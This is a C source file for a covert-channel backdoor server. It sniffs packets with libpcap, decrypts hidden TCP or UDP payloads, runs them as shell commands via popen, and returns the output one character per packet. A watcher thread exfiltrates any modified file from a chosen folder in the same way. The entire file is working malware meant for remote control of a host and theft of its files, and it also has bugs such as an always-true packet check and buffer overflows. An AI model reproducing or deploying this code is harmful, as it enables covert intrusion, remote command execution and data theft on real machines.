/*
 * server.c
 *
 *  Created on: Jun 4, 2014
 *      Author: root
 */

#include <errno.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/if_ether.h>
#include <net/ethernet.h>
#include <netinet/ether.h>
#include <sys/inotify.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <pthread.h>
#include <signal.h>
#include <sys/types.h>

#include "server.h"
#include "util.h"
#include "covert.h"

struct bpf_program fltr_prog;

struct exfil_pack {
	uint32 src;
	uint32 ipaddr;
	char *folder;
};

int channel;
uint32 ip_addr;

void pcap_init(uint32 src, uint32 ipaddr, char *folder, int chan) {
	pcap_t* nic;
	char errbuf[PCAP_ERRBUF_SIZE];
	pthread_t exfil_thread;
	struct exfil_pack expack;
	char * fltr_str = PKT_T_FLT;

	channel = chan;
	ip_addr = ipaddr;

	if (channel == 2)
		fltr_str = PKT_U_FLT;

// Setup Exfil Watch
	expack.src = src;
	expack.ipaddr = ipaddr;
	expack.folder = folder;
	pthread_create(&exfil_thread, NULL, exfil_watch, &expack);

	if ((nic = pcap_open_live(NET_DEVICE, MAX_LEN, 0, -1, errbuf)) == NULL)
		error(errbuf);

// Get packet fltr_str from arguments
	if (pcap_compile(nic, &fltr_prog, fltr_str, 0, 0) == -1)
		error("pcap_init(): pcap_compile");

// Set fltr_str for captures
	if (pcap_setfilter(nic, &fltr_prog) == -1)
		error("pcap_init(): pcap_setfltr_str");

// Start capturing, make sure to heavily restrict our CPU usage.
	while (TRUE) {
		if (pcap_dispatch(nic, -1, pkt_handler, NULL) < 0)
			error("pcap_init(): pcap_loop");
		usleep(5000); // sleep 5ms
	}

	pthread_join(exfil_thread, NULL);
}

void pkt_handler(u_char *user, const struct pcap_pkthdr *pkt_info,
		const u_char *packet) {

	struct iphdr* iphdr;
	int size_ip;

	// skips to the IP header of the packet
	iphdr = (struct iphdr*) (packet + sizeof(struct ether_header));
	size_ip = iphdr->ihl * 4;

	// check to see if the packet is complete
	if (size_ip < sizeof(struct iphdr))
		error("pkt_handler(): Truncated IP Header");

	// check if the packet is intended for the backdoor server
	if (ntohs(iphdr->id) >= 5000 || ntohs(iphdr->id) <= 5050) {
		switch (iphdr->protocol) {
		case IPPROTO_TCP:
			printf("protocol TCP");
			handle_tcp(user, pkt_info, packet);
			break;
		case IPPROTO_UDP:
			handle_udp(user, pkt_info, packet);
			break;
		}
	}

}

void handle_tcp(u_char *user, const struct pcap_pkthdr *pkt_info,
		const u_char *packet) {
	struct tcphdr* tcphdr;
	struct iphdr* iphdr;
	int size_tcp, ip_len;
	char *tcp_payload;

	tcp_payload = malloc(sizeof(char *));

	iphdr = (struct iphdr*) (packet + sizeof(struct ether_header));
	ip_len = iphdr->ihl * 4;

	tcphdr = (struct tcphdr*) (packet + sizeof(struct ether_header) + ip_len);
	size_tcp = tcphdr->doff * 4;

	if (size_tcp < TCP_HDR_SIZ)
		error("handle_tcp(): invalid TCP size");

	// retrieves the TCP payload
	tcp_payload = (char *) (packet + sizeof(struct ether_header) + ip_len
			+ size_tcp);

	// decrypt the payload and copy it into decrypt_payload variable.
	decrypt(SEKRET, tcp_payload, sizeof(tcp_payload));
	printf("PAYLOAD => %s", tcp_payload);

	cmd_execute(tcp_payload, iphdr->daddr, ip_addr);
}

void handle_udp(u_char *user, const struct pcap_pkthdr *pkt_info,
		const u_char *packet) {
	//struct udphdr* udphdr;
	struct iphdr* iphdr;
	int size_udp, ip_len;
	char *udp_payload;

	iphdr = (struct iphdr*) (packet + sizeof(struct ether_header));
	ip_len = iphdr->ihl * 4;

	//udphdr = (struct udphdr*) (iphdr + sizeof(struct ether_header) + ip_len);
	size_udp = sizeof(struct udphdr);

	if (size_udp < UDP_HDR_SIZ)
		error("handle_udp(): invalid UDP size");

	// retrieves the UDP payload
	udp_payload = (char *) (iphdr + ip_len + size_udp);

	// decrypt the payload .
	decrypt(SEKRET, udp_payload, sizeof(udp_payload));

	printf("UDP PAYLOAD = %s", udp_payload);

	cmd_execute(udp_payload, iphdr->daddr, ip_addr);
}

void cmd_execute(char *command, uint32 src, uint32 ip) {
	FILE *fp;
	char line[MAX_LEN];
	char resp[MAX_LEN];
	int tot_len, i = 0;

	printf("Command => %s\n", command);
	memset(line, 0, MAX_LEN);
	memset(resp, 0, MAX_LEN);

	// Run the command, grab stdout
	fp = popen(command, "r");

	// Append line by line output into response buffer
	while (fgets(line, MAX_LEN, fp) != NULL) {
		strcat(resp, line);
		printf("line =>  %s\n", line);
	}

	strcat(resp, "\n");

	tot_len = strlen(resp) + 1;

	printf("Response Len => %d\n", tot_len);

	for (i = 0; i < tot_len; i++) {

		char tcp_seq;

		tcp_seq = resp[i];
		usleep(SLEEP_TIME); // sleep for specific amount of time
		_send(src, ip, tcp_seq, RSP_TYP); // send the packet as a response packet
	}

	// close the pipe file pointer
	pclose(fp);
}

void *exfil_watch(void *arg) {
	int fd, wd, ret;
	static struct inotify_event *event;
	fd_set rfds;
	struct exfil_pack expck;
	uint32 ipaddr;
	uint32 src;
	char *folder;

	expck = *(struct exfil_pack*) arg;
	src = expck.src;
	ipaddr = expck.ipaddr;
	folder = expck.folder;

	printf("Folder => %s", folder);

	fd = inotify_init();
	if (fd < 0)
		error("exfil_watch(): inotify init");

	wd = inotify_add_watch(fd, folder, (uint32) IN_MODIFY);

	if (wd < 0)
		error("exfil_watch(): inotify add watch");

	FD_ZERO(&rfds);
	FD_SET(fd, &rfds);

	while (TRUE) {
		int i = 0;
		int len;
		char buf[BUF_LEN];

		ret = select(fd + 1, &rfds, NULL, NULL, NULL);
		len = read(fd, buf, BUF_LEN);

		if (len < 0 && errno != EINTR)
			error("exfil_watch(): read");
		else if (len == 0)
			error("exfil_watch(): inotify buffer too small");

		while (i < len) {
			event = (struct inotify_event *) &buf[i];

			if (event->len) {
				char path[MAX_LEN];
				strncpy(path, folder, MAX_LEN);
				strcat(path, "/");
				strcat(path, event->name);
				exfil_send(src, ipaddr, path);
			}

			i += EVENT_SIZE + event->len;
		}

		if (ret < 0)
			error("exfil_watch(): select");
		else if (!ret)
			printf("exfil_watch(): timed out\n");
	}

	printf("Cleaning up and Terminating......\n");
	fflush(stdout);
	ret = inotify_rm_watch(fd, wd);
	if (ret)
		error("exfil_watch(): inotify rm watch");
	else if (close(fd))
		error("exfil_watch(): close");

	return NULL;
}

void exfil_send(uint32 src, uint32 ipaddr, char *path) {
	int buflen, i, path_size, init = 0;
	char buffer[MAX_LEN], folder_path[MAX_LEN];
	FILE *file;

	strcpy(folder_path, path);
	path_size = strlen(path) + 1; // path size

	file = open_file(path, FALSE);

	while ((buflen = fread(buffer, 1, MAX_LEN, file)) > 0) {
		char *trans;
		int tot_len;

		tot_len = buflen + 1;
		trans = (char *) malloc(tot_len);
		memcpy(trans, buffer, tot_len);
		printf("Buflen => %d\n", tot_len);

		// sending the filename, including the path...
		if (init == 0) {
			for (i = 0; i < path_size; i++) {
				char tcp_seq;
				tcp_seq = folder_path[i];
				usleep(SLEEP_TIME);
				_send(src, ipaddr, tcp_seq, XFL_TYP);
			}
			_send(src, ipaddr, '\n', XFL_TYP);
			_send(src, ipaddr, '\n', XFL_TYP);
			init = 1;
		}

		// Sending the File content
		for (i = 0; i < tot_len; i++) {
			char tcp_seq;
			tcp_seq = buffer[i];
			usleep(SLEEP_TIME); // sleep for specific amount of time
			_send(src, ipaddr, tcp_seq, XFL_TYP); // send the packet as a response packet
		}
	}
	fclose(file);
}
